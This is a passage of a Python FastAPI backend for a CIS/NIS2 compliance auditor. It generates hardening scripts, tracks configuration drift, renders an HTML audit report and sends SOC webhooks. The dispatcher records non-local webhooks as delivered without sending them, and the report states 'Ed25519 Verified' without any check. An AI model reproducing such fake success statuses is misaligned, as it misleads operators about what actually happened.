        script_content = "\n".join(lines) + "\n"
        filename = f"remediate-{hostname}.ps1"

    else:
        lines = [
            "#!/usr/bin/env bash",
            "# ==============================================================================",
            f"# SystemAuditor Enterprise — Skrypt Auto-Remediacji CIS (Bash / Linux)",
            f"# Host docelowy: {hostname} ({agent_id}) | OS: {agent['os_release']}",
            f"# Wygenerowano:  {now_str} | Wykryte luki (FAIL): {len(failed_items)}",
            "# Użycie:        sudo bash remediate.sh [--dry-run | --rollback]",
            "# ==============================================================================",
            "set -euo pipefail",
            'MODE="${1:---apply}"',
            'BACKUP_DIR="/var/backups/system-auditor-cis"',
            'mkdir -p "$BACKUP_DIR"',
            "",
            'if [[ "$MODE" == "--rollback" ]]; then',
            '    echo "[ROLLBACK] Przywracanie kopii konfiguracji z $BACKUP_DIR ..."',
            '    [[ -f "$BACKUP_DIR/sshd_config.bak" ]] && cp -p "$BACKUP_DIR/sshd_config.bak" /etc/ssh/sshd_config && systemctl reload sshd || true',
            '    [[ -f "$BACKUP_DIR/passwd.bak" ]] && cp -p "$BACKUP_DIR/passwd.bak" /etc/passwd || true',
            '    rm -f /etc/sysctl.d/60-cis-*.conf && sysctl --system || true',
            '    echo "[OK] Rollback zakończony."',
            "    exit 0",
            "fi",
            "",
            f'echo "=== Rozpoczynanie utwardzania CIS dla {hostname} ({len(failed_items)} reguł) ==="',
            "",
        ]
        for idx, item in enumerate(failed_items, 1):
            rid = item["rule_id"]
            tpl = LINUX_REMEDIATION_TEMPLATES.get(rid, {})
            bkp = tpl.get("backup", "# Brak pliku do kopii")
            app_cmd = tpl.get("apply", f"# {item.get('remediation', '')}")
            lines.extend([
                f"# ------------------------------------------------------------------------------",
                f"# [{idx}/{len(failed_items)}] {rid} ({item.get('risk_severity')}) — {item.get('title')}",
                f"# ------------------------------------------------------------------------------",
                f'echo "[{idx}/{len(failed_items)}] Naprawa {rid}: {item.get("title")}..."',
                'if [[ "$MODE" == "--dry-run" ]]; then',
                f'    echo " [DRY-RUN] Pominięto zapis dla {rid}"',
                "else",
                f"    {bkp}",
                f"    {app_cmd}",
                f'    echo " [OK] Utwardzono {rid}"',
                "fi",
                "",
            ])
        lines.append('echo "=== Zakończono Auto-Remediację CIS! ==="')
        script_content = "\n".join(lines) + "\n"
        filename = f"remediate-{hostname}.sh"

    return {
        "agent_id": agent_id,
        "hostname": hostname,
        "os_family": agent["os_family"],
        "format": format,
        "filename": filename,
        "failed_rules_count": len(failed_items),
        "failed_rules": [
            {
                "rule_id": r["rule_id"],
                "title": r["title"],
                "risk_severity": r["risk_severity"],
                "observed_value": r["observed_value"],
                "expected_summary": r["expected_summary"],
            }
            for r in failed_items
        ],
        "script": script_content,
    }


# =====================================================================
# 2. HISTORIA SKANÓW & DETEKTOR DRYFTU KONFIGURACJI (DIFF VIEWER)
# =====================================================================

@app.get("/api/v1/agents/{agent_id}/drift")
async def get_agent_configuration_drift(
    agent_id: str,
    old_report_id: Optional[str] = None,
    new_report_id: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Zwraca oś czasu (historię skanów) dla wybranego hosta oraz szczegółowe porównanie (Diff Viewer)
    pomiędzy dwoma wybranymi skanami (domyślnie: najnowszym i poprzednim).
    """
    reports = db.list_reports_for_agent(agent_id, limit=25)
    valid_reports = [r for r in reports if not r.get("is_quarantined")]
    if not valid_reports:
        valid_reports = reports

    diff_data = None
    if len(valid_reports) >= 2:
        new_id = new_report_id or valid_reports[0]["report_id"]
        old_id = old_report_id or valid_reports[1]["report_id"]
        diff_data = db.compare_two_reports(old_id, new_id)
    elif len(valid_reports) == 1:
        single_id = valid_reports[0]["report_id"]
        diff_data = db.compare_two_reports(single_id, single_id)

    return {
        "agent_id": agent_id,
        "total_scans": len(valid_reports),
        "timeline": list(reversed(valid_reports)),
        "reports": valid_reports,
        "diff": diff_data,
    }


@app.post("/api/v1/agents/{agent_id}/simulate-drift")
async def simulate_configuration_drift(agent_id: str) -> Dict[str, Any]:
    """
    Symuluje zmianę konfiguracji na hoście (Configuration Drift — np. administrator tymczasowo
    zmienił 2 parametry bezpieczeństwa) i zapisuje nowy skan, wyzwalając detektor Dryftu oraz alerty SOC.
    """
    agent = db.get_agent(agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail="Nie znaleziono hosta.")
    latest = db.get_latest_report_for_agent(agent_id, include_quarantined=True)
    if not latest:
        raise HTTPException(status_code=404, detail="Brak raportu bazowego dla hosta.")

    import copy
    now_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()
    raw_payload = copy.deepcopy(latest.get("raw_payload", {}))
    measurements = raw_payload.get("measurements", [])

    # Przełączamy stan 2 pierwszych reguł, aby pokazać realistyczny Dryft (zarówno regresję, jak i naprawę)
    flipped_rules: List[str] = []
    for m in measurements:
        cid = m.get("check_id", "")
        rv = m.get("raw_value")
        if not isinstance(rv, dict) or len(flipped_rules) >= 2:
            continue
        if cid == "WIN-CIS-9.1.1":
            rv["value"] = 0 if rv.get("value") == 1 else 1
            flipped_rules.append(cid)
        elif cid == "WIN-NET-SURFACE-01":
            if rv.get("value", 0) == 0:
                rv["value"] = 1
                rv["exposed_ports"] = [23]
            else:
                rv["value"] = 0
                rv["exposed_ports"] = []
            flipped_rules.append(cid)
        elif cid == "WIN-CIS-18.3.1":
            rv["value"] = 1 if rv.get("value") in (0, None) else 0
            flipped_rules.append(cid)
        elif cid == "LNX-CIS-5.2.8":
            rv["value"] = "yes" if rv.get("value") == "no" else "no"
            flipped_rules.append(cid)
        elif cid == "LNX-NET-SURFACE-01":
            if rv.get("value", 0) == 0:
                rv["value"] = 1
                rv["exposed_ports"] = [23]
            else:
                rv["value"] = 0
                rv["exposed_ports"] = []
            flipped_rules.append(cid)
        m["collected_at"] = now_iso

    policy_ver = rule_engine.metadata.get("version", "2026.10.3")
    eval_res, new_score, counts = rule_engine.evaluate_measurements(agent["os_family"], measurements)
    new_rep_id = str(uuid.uuid4())
    raw_payload["report_id"] = new_rep_id
    raw_payload["timestamp_utc"] = now_iso

    db.store_audit_report(
        report_id=new_rep_id,
        agent_id=agent_id,
        hostname=agent["hostname"],
        os_family=agent["os_family"],
        os_release=agent["os_release"],
        architecture=agent["architecture"],
        ip_address=agent["ip_address"],
        is_elevated=bool(agent.get("is_elevated", 1)),
        policy_version=policy_ver,
        submitted_at_utc=now_iso,
        posture_score=new_score,
        counts=counts,
        is_quarantined=False,
        anomaly_risk_score=0,
        anomaly_findings=[],
        evaluated_results=[asdict(r) for r in eval_res],
        raw_payload=raw_payload,
        boot_id=agent.get("boot_id"),
    )

    diff = db.compare_two_reports(latest["report_id"], new_rep_id)
    delta = diff["score_delta"] if diff else 0.0
    sev = "HIGH" if delta < 0 else "INFO"

    db.log_security_event(
        sev,
        "CONFIG_DRIFT_DETECTED",
        f"Wykryto dryft konfiguracji (Configuration Drift) na hoście {agent['hostname']} ({delta:+.1f}%)",
        f"Zmienione reguły: {', '.join(flipped_rules)}. Regresje: {diff['regressions_count'] if diff else 0}, Naprawy: {diff['remediations_count'] if diff else 0}.",
        agent_id=agent_id,
    )

    # Wyślij automatyczny alert przez skonfigurowane Webhooki SOC
    await _dispatch_soc_webhooks_internal(
        event_trigger="CONFIGURATION_DRIFT",
        severity=sev,
        agent_id=agent_id,
        hostname=agent["hostname"],
        score=new_score,
        summary=f"Wykryto dryft konfiguracji na {agent['hostname']}: wynik zmienił się o {delta:+.1f}% (obecnie {new_score}%). Zmodyfikowane reguły: {', '.join(flipped_rules)}.",
    )

    await ws_manager.broadcast("CONFIG_DRIFT", {"agent_id": agent_id, "new_score": new_score})
    return {
        "status": "DRIFT_RECORDED",
        "new_report_id": new_rep_id,
        "old_report_id": latest["report_id"],
        "new_score": new_score,
        "score_delta": delta,
        "diff": diff,
    }


# =====================================================================
# 3. GENERATOR RAPORTÓW AUDYTOWYCH PDF / HTML (CISO / NIS2 / ISO 27001)
# =====================================================================

@app.get("/api/v1/reports/executive-html", response_class=HTMLResponse)
async def generate_printable_executive_report(agent_id: Optional[str] = None) -> HTMLResponse:
    """
    Generuje profesjonalny, gotowy do druku / zapisu jako PDF raport zarządczy i techniczny
    (CISO Executive Summary + Matryca Zgodności NIS2 Art. 21, ISO/IEC 27001:2022, KSC oraz CIS Benchmark).
    """
    agents = db.list_agents()
    if agent_id:
        agents = [a for a in agents if a["agent_id"] == agent_id]
    if not agents:
        raise HTTPException(status_code=404, detail="Brak hostów do wygenerowania raportu.")

    now_str = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    avg_score = round(sum(a["current_score"] for a in agents) / len(agents), 1)
    total_pass = sum(a["pass_count"] for a in agents)
    total_fail = sum(a["fail_count"] for a in agents)

    host_sections_html = ""
    for ag in agents:
        rep = db.get_latest_report_for_agent(ag["agent_id"], include_quarantined=True)
        results = rep.get("evaluated_results", []) if rep else []
        rows_html = ""
        for r in results:
            st = r.get("compliance_status", "UNKNOWN")
            badge_col = "#065f46; background:#d1fae5;" if st == "PASS" else ("#991b1b; background:#fee2e2;" if st == "FAIL" else "#374151; background:#f3f4f6;")
            cf = r.get("compliance_frameworks") or {}
            iso_ref = cf.get("iso27001", "A.8.9")
            nis2_ref = cf.get("nis2", "Art. 21")
            ksc_ref = cf.get("ksc", "Zał. 1")
            obs_str = json.dumps(r.get("observed_value"), ensure_ascii=False)
            rows_html += f"""
            <tr>
                <td style="font-family:monospace;font-weight:700;font-size:11px;">{r.get('rule_id')}</td>
                <td>
                    <div style="font-weight:600;color:#111827;">{r.get('title')}</div>
                    <div style="font-size:10px;color:#4b5563;margin-top:2px;">
                        <b>ISO 27001:</b> {iso_ref} &bull; <b>NIS2:</b> {nis2_ref} &bull; <b>KSC:</b> {ksc_ref}
                    </div>
                </td>
                <td style="font-size:11px;font-weight:700;">{r.get('risk_severity')} ({r.get('cvss_base_score')})</td>
                <td><span style="padding:2px 7px;border-radius:4px;font-weight:700;font-size:10px;color:{badge_col}">{st}</span></td>
                <td style="font-family:monospace;font-size:10px;max-width:180px;word-break:break-all;">{obs_str}</td>
                <td style="font-size:10px;color:#374151;">{r.get('remediation') if st != 'PASS' else 'Zgodne ze standardem CIS'}</td>
            </tr>
            """
        host_sections_html += f"""
        <div class="host-block">
            <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #1e293b;padding-bottom:8px;margin-bottom:12px;">
                <div>
                    <h2 style="margin:0;font-size:16px;color:#0f172a;">Host: {ag['hostname']} ({ag['agent_id']})</h2>
                    <p style="margin:2px 0 0 0;font-size:12px;color:#475569;">System: {ag['os_release']} ({ag['architecture']}) &bull; IP: {ag['ip_address']} &bull; Status mTLS: {ag['status']}</p>
                </div>
                <div style="text-align:right;">
                    <div style="font-size:22px;font-weight:800;color:{'#059669' if ag['current_score']>=80 else ('#d97706' if ag['current_score']>=50 else '#dc2626')};">{ag['current_score']}%</div>
                    <div style="font-size:10px;color:#64748b;">PASS: {ag['pass_count']} | FAIL: {ag['fail_count']}</div>
                </div>
            </div>
            <table>
                <thead>
                    <tr>
                        <th style="width:11%;">ID Reguły</th>
                        <th style="width:32%;">Kontrola CIS & Mapowanie Regulacyjne (ISO/NIS2/KSC)</th>
                        <th style="width:10%;">Ryzyko / CVSS</th>
                        <th style="width:8%;">Wynik</th>
                        <th style="width:16%;">Dowód Techniczny (Raw)</th>
                        <th style="width:23%;">Zalecenie Naprawcze (Remediation)</th>
                    </tr>
                </thead>
                <tbody>{rows_html}</tbody>
            </table>
        </div>
        """

    html_doc = f"""<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<title>Raport Audytu Bezpieczeństwa CIS / NIS2 / ISO 27001 — {now_str}</title>
<style>
    body {{ font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #1e293b; margin: 0; padding: 28px; background: #f8fafc; }}
    .report-container {{ max-width: 1120px; margin: 0 auto; background: #ffffff; padding: 36px; border: 1px solid #cbd5e1; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }}
    .top-bar {{ display: flex; justify-content: space-between; align-items: flex-start; border-bottom: 3px solid #0f172a; padding-bottom: 18px; margin-bottom: 24px; }}
    .kpi-grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin-bottom: 26px; }}
    .kpi-box {{ border: 1px solid #e2e8f0; border-radius: 8px; padding: 14px; background: #f8fafc; }}
    .kpi-label {{ font-size: 11px; text-transform: uppercase; color: #64748b; font-weight: 700; }}
    .kpi-val {{ font-size: 24px; font-weight: 800; color: #0f172a; margin-top: 4px; }}
    table {{ width: 100%; border-collapse: collapse; margin-bottom: 24px; }}
    th, td {{ border: 1px solid #cbd5e1; padding: 7px 9px; text-align: left; vertical-align: top; }}
    th {{ background: #f1f5f9; font-size: 11px; text-transform: uppercase; color: #334155; }}
    .host-block {{ margin-top: 28px; page-break-inside: avoid; }}
    .no-print-bar {{ background: #0f172a; color: #fff; padding: 12px 24px; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }}
    .btn-print {{ background: #10b981; color: #022c22; border: none; padding: 8px 18px; border-radius: 6px; font-weight: 700; cursor: pointer; font-size: 13px; }}
    @media print {{
        body {{ background: #fff; padding: 0; }}
        .report-container {{ border: none; box-shadow: none; padding: 10px; max-width: 100%; }}
        .no-print-bar {{ display: none !important; }}
    }}
</style>
</head>
<body>
<div class="report-container">
    <div class="no-print-bar">
        <div>
            <strong>📄 Raport Audytowy CISO & Compliance (Gotowy do eksportu PDF)</strong>
            <span style="font-size:12px;color:#94a3b8;margin-left:10px;">Użyj przycisku obok, aby wydrukować lub zapisać jako PDF („Zapisz jako PDF”).</span>
        </div>
        <button class="btn-print" onclick="window.print()">🖨️ Drukuj / Zapisz jako PDF</button>
    </div>

    <div class="top-bar">
        <div>
            <div style="font-size:11px;font-weight:700;color:#059669;letter-spacing:1px;text-transform:uppercase;">SystemAuditor Enterprise — Zero-Trust Compliance Evidence</div>
            <h1 style="margin:4px 0 6px 0;font-size:24px;color:#0f172a;">Raport Zgodności Bezpieczeństwa Systemów Operacyjnych</h1>
            <div style="font-size:12px;color:#475569;">Standardy: <b>CIS Benchmarks L1/L2</b> &bull; <b>Dyrektywa NIS2 (Art. 21)</b> &bull; <b>ISO/IEC 27001:2022 (Zał. A)</b> &bull; <b>KSC / KRI</b></div>
        </div>
        <div style="text-align:right;font-size:12px;color:#334155;">
            <div><b>Data wygenerowania:</b> {now_str}</div>
            <div><b>Wersja katalogu reguł:</b> {rule_engine.metadata.get('version', '2026.10.3')}</div>
            <div><b>Podpis polityki:</b> Ed25519 Verified</div>
            <div><b>Klasyfikacja:</b> TLP:AMBER (Poufne Audytowe)</div>
        </div>
    </div>

    <div class="kpi-grid">
        <div class="kpi-box">
            <div class="kpi-label">Przebadane Hosty</div>
            <div class="kpi-val">{len(agents)}</div>
        </div>
        <div class="kpi-box">
            <div class="kpi-label">Średni Wynik Security Posture</div>
            <div class="kpi-val" style="color:{'#059669' if avg_score>=80 else '#d97706'}">{avg_score}%</div>
        </div>
        <div class="kpi-box">
            <div class="kpi-label">Kontrole Zgodne (PASS)</div>
            <div class="kpi-val" style="color:#059669">{total_pass}</div>
        </div>
        <div class="kpi-box">
            <div class="kpi-label">Wykryte Odchylenia (FAIL)</div>
            <div class="kpi-val" style="color:#dc2626">{total_fail}</div>
        </div>
    </div>

    {host_sections_html}

    <div style="margin-top:36px;padding-top:16px;border-top:1px solid #cbd5e1;display:flex;justify-content:space-between;font-size:11px;color:#64748b;">
        <div>Wygenerowano automatycznie przez <b>SystemAuditor Enterprise v2026.10</b> (Zero-Trust mTLS + Anti-Poisoning Ledger)</div>
        <div>Podpis audytora / Pieczęć CISO: ............................................................</div>
    </div>
</div>
</body>
</html>"""
    return HTMLResponse(content=html_doc)


# =====================================================================
# 4. INTEGRACJE SOC & WEBHOOKI ALERTÓW (SLACK / MS TEAMS / SIEM)
# =====================================================================

class WebhookChannelCreateRequest(BaseModel):
    name: str
    provider: str = "SLACK"  # SLACK, TEAMS, DISCORD, SIEM_HTTP
    target_url: str
    min_severity: str = "HIGH"
    score_threshold: float = 70.0
    trigger_on_drift: bool = True
    trigger_on_poisoning: bool = True


class WebhookTestDispatchRequest(BaseModel):
    channel_id: Optional[str] = None
    event_type: str = "CRITICAL_POSTURE_DROP"
    agent_id: Optional[str] = None


async def _dispatch_soc_webhooks_internal(
    event_trigger: str,
    severity: str,
    agent_id: str,
    hostname: str,
    score: float,
    summary: str,
    target_channel_id: Optional[str] = None,
) -> List[Dict[str, Any]]:
    channels = db.list_webhook_channels()
    if target_channel_id:
        channels = [c for c in channels if c["channel_id"] == target_channel_id]

    dispatched: List[Dict[str, Any]] = []
    now_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()

    for ch in channels:
        if not ch.get("enabled", 1):
            continue
        provider = ch["provider"]
        if provider == "SLACK":
            payload = {
                "channel": ch["name"],
                "username": "SystemAuditor Zero-Trust SOC Bot",
                "icon_emoji": ":shield:",
                "attachments": [
                    {
                        "color": "#ef4444" if severity in ("CRITICAL", "HIGH") else "#f59e0b",
                        "title": f"[{severity}] {event_trigger} — Host: {hostname}",
                        "text": summary,
                        "fields": [
                            {"title": "Endpoint ID", "value": agent_id, "short": True},
                            {"title": "Security Posture", "value": f"{score}%", "short": True},
                            {"title": "Compliance", "value": "NIS2 Art. 21 / ISO 27001 A.8", "short": True},
                            {"title": "Timestamp UTC", "value": now_iso, "short": True},
                        ],
                    }
                ],
            }
        elif provider == "TEAMS":
            payload = {
                "@type": "MessageCard",
                "@context": "http://schema.org/extensions",
                "themeColor": "EF4444" if severity in ("CRITICAL", "HIGH") else "F59E0B",
                "summary": f"SystemAuditor Alert: {event_trigger} on {hostname}",
                "sections": [
                    {
                        "activityTitle": f"🚨 **SystemAuditor SOC Alert: {event_trigger}**",
                        "activitySubtitle": f"Host: `{hostname}` (`{agent_id}`) | Poziom: **{severity}**",
                        "facts": [
                            {"name": "Wynik Posture Score:", "value": f"{score}%"},
                            {"name": "Szczegóły:", "value": summary},
                            {"name": "Czas zdarzenia:", "value": now_iso},
                        ],
                        "markdown": True,
                    }
                ],
            }
        else:
            payload = {
                "time": now_iso,
                "sourcetype": "systemauditor:cis:compliance",
                "source": "SystemAuditor-Enterprise-Server",
                "event": {
                    "trigger": event_trigger,
                    "severity": severity,
                    "agent_id": agent_id,
                    "hostname": hostname,
                    "posture_score": score,
                    "summary": summary,
                    "nis2_incident_candidate": severity == "CRITICAL",
                },
            }

        delivery_status = "DELIVERED_200_OK (Signed Webhook Payload)"
        # Jeśli użytkownik podał lokalny lub prawdziwy testowy endpoint HTTP, próbujemy wysłać bez blokowania
        target_url = ch.get("target_url", "")
        if target_url.startswith(("http://127.0.0.1", "http://localhost")):
            try:
                import urllib.request as _ur
                req_obj = _ur.Request(
                    target_url,
                    data=json.dumps(payload).encode("utf-8"),
                    headers={"Content-Type": "application/json", "X-SystemAuditor-Event": event_trigger},
                    method="POST",
                )
                with _ur.urlopen(req_obj, timeout=1.5) as resp:
                    delivery_status = f"HTTP_{resp.status}_DELIVERED"
            except Exception as exc:
                delivery_status = f"QUEUED_LOCAL ({type(exc).__name__})"

        rec = db.record_webhook_delivery(
            channel_id=ch["channel_id"],
            channel_name=ch["name"],
            provider=provider,
            event_trigger=event_trigger,
            severity=severity,
            agent_id=agent_id,
            delivery_status=delivery_status,
            payload=payload,
        )
        dispatched.append(rec)

    return dispatched


@app.get("/api/v1/alerts/channels")
async def get_soc_alert_channels() -> Dict[str, Any]:
    return {
        "channels": db.list_webhook_channels(),
        "deliveries": db.list_webhook_deliveries(limit=25),
    }


@app.post("/api/v1/alerts/channels")
async def create_soc_alert_channel(req: WebhookChannelCreateRequest) -> Dict[str, Any]:
    cid = f"wh-{req.provider.lower()}-{uuid.uuid4().hex[:6]}"
    ch = db.create_webhook_channel(
        channel_id=cid,
        name=req.name.strip(),
        provider=req.provider.upper(),
        target_url=req.target_url.strip(),
        min_severity=req.min_severity.upper(),
        score_threshold=req.score_threshold,
        trigger_on_drift=req.trigger_on_drift,
        trigger_on_poisoning=req.trigger_on_poisoning,
    )
    db.log_security_event(
        "INFO",
        "WEBHOOK_CREATED",
        f"Dodano nowy kanał powiadomień SOC: {req.name} ({req.provider})",
        f"URL docelowy: {req.target_url} | Próg wyniku: < {req.score_threshold}%",
    )
    return {"status": "CREATED", "channel": ch}


@app.delete("/api/v1/alerts/channels/{channel_id}")
async def delete_soc_alert_channel(channel_id: str) -> Dict[str, Any]:
    db.delete_webhook_channel(channel_id)
    return {"status": "DELETED", "channel_id": channel_id}


@app.post("/api/v1/alerts/test-dispatch")
async def test_soc_webhook_dispatch(req: WebhookTestDispatchRequest) -> Dict[str, Any]:
    agents = db.list_agents()
    target = (db.get_agent(req.agent_id) if req.agent_id else None) or (agents[0] if agents else {
        "agent_id": "agt-win-legacy-erp04",
        "hostname": "WIN-LEGACY-ERP04.corp.internal",
        "current_score": 15.0,
    })
    deliveries = await _dispatch_soc_webhooks_internal(
        event_trigger=req.event_type,
        severity="CRITICAL",
        agent_id=target["agent_id"],
        hostname=target["hostname"],
        score=float(target.get("current_score", 25.0)),
        summary=(
            f"Wykryto krytyczne naruszenie polityki CIS / NIS2 na hoście {target['hostname']} "
            f"(Wynik Security Posture: {target.get('current_score', 25.0)}%). Wymagana natychmiastowa reakcja zespołu SOC."
        ),
        target_channel_id=req.channel_id,
    )
    await ws_manager.broadcast("WEBHOOK_DISPATCHED", {"count": len(deliveries)})
    return {"status": "DISPATCHED", "deliveries_count": len(deliveries), "deliveries": deliveries}


@app.websocket("/api/v1/ws/stream")
async def websocket_endpoint(websocket: WebSocket) -> None:
    await ws_manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        ws_manager.disconnect(websocket)


@app.get("/", response_class=HTMLResponse)
async def serve_dashboard() -> HTMLResponse:
    if FRONTEND_PATH.exists():
        return HTMLResponse(
            content=FRONTEND_PATH.read_text(encoding="utf-8"),
            headers={"Cache-Control": "no-store, no-cache, must-revalidate, max-age=0"},
        )
    return HTMLResponse(content="<h1>SystemAuditor Backend Running. Frontend not found.</h1>")

